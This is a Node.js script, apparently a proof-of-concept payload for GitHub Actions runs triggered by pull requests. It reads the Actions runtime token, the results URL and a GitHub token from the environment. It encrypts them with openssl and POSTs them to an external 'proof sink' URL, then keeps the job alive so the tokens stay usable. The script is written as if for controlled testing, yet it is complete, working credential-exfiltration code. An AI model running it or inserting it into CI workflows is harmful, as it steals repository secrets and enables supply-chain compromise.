'use strict'

const fs = require('fs')
const {execFileSync} = require('child_process')

async function main() {
  const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN || ''
  const resultsUrl = process.env.ACTIONS_RESULTS_URL || ''
  const githubToken = process.env.GITHUB_TOKEN_TO_SEAL || ''
  const certB64 = process.env.CAPTURE_CERT_B64 || ''
  const proofSink = process.env.PROOF_SINK || ''
  const marker = process.env.CAPABILITY_MARKER || ''
  const holdSeconds = Number(process.env.HOLD_SECONDS || '120')

  if (!runtimeToken || !resultsUrl || !githubToken || !certB64 || !proofSink || !marker || !Number.isFinite(holdSeconds) || holdSeconds < 0) {
    throw new Error('required runtime capability or controlled input is unavailable')
  }

  fs.writeFileSync('recipient.pem', Buffer.from(certB64, 'base64'))
  fs.writeFileSync('capabilities.json', JSON.stringify({
    runtime_token: runtimeToken,
    results_url: resultsUrl,
    github_token: githubToken
  }))
  execFileSync('openssl', [
    'cms', '-encrypt', '-aes256', '-binary', '-outform', 'DER',
    '-recip', 'recipient.pem', '-in', 'capabilities.json', '-out', 'capabilities.der'
  ], {stdio: 'ignore'})

  const response = await fetch(proofSink, {
    method: 'POST',
    headers: {'content-type': 'application/json'},
    body: JSON.stringify({
      repository: process.env.GITHUB_REPOSITORY,
      run_id: process.env.GITHUB_RUN_ID,
      actor: process.env.GITHUB_ACTOR,
      event_name: process.env.GITHUB_EVENT_NAME,
      head_repository: process.env.GITHUB_HEAD_REPOSITORY || '',
      encrypted: fs.readFileSync('capabilities.der').toString('base64'),
      marker
    })
  })
  if (!response.ok) {
    throw new Error(`controlled callback failed with HTTP ${response.status}`)
  }

  console.log(`SEALED_EXTERNAL_PR_CAPABILITY_SENT run=${process.env.GITHUB_RUN_ID}`)
  await new Promise(resolve => setTimeout(resolve, holdSeconds * 1000))
}

main().catch(error => {
  console.error(error instanceof Error ? error.message : String(error))
  process.exitCode = 1
})
